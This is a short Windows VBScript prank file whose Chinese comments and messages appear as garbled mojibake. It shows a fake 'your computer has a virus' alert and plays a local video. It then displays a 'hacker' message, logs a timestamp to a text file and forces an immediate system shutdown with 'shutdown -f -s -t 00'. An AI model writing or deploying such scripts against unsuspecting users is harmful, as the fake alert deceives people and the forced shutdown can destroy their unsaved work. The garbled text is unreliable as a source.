'https://toonme.com/result
'ANSI����
'vbsС����(���е�����ػ�!)
'������D:\3dģ��\�����ļ�\�ϰ�ԭ��.mp4
'����D:\3dģ��\�����ļ�\������־\��־.txt
'����
msgbox "��ĵ��Գ������ļ�����Ҫ���ϰ�ԭ��.mp4",vbYesNoCancel+VbExclamation,"���Գ�������"
Set ws = CreateObject("WScript.Shell")
ws.Run "D:\3dģ��\�����ļ�\�ϰ�ԭ��.mp4",True
'����
wscript.sleep 1000*4
'�ڿ;���
msgbox "�Ҷ�������,Ҫ���ھ͸����Թػ�!",vbYesNoCancel+VbExclamation,"hacker"
'������־
CurrentTime=Hour(Now)&":"&Minute(Now)&":"&Second(Now)
Currentdate2=year(Now)&"-"&Month(Now)&"-"&day(Now)
set fs =createobject("scripting.filesystemobject")
if (fs.fileexists("D:\3dģ��\�����ļ�\������־\��־.txt")) then
set f =fs.opentextfile("D:\3dģ��\�����ļ�\������־\��־.txt",8)
f.writeblanklines(3)
f.write Currentdate2
f.writeblanklines(1)
f.write CurrentTime
f.close
end if
'�ػ�
wscript.sleep 1000*5
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "shutdown -f -s -t 00",0 ,true
'https://codecombat.163.com/news/jikezhanji-daomuzhe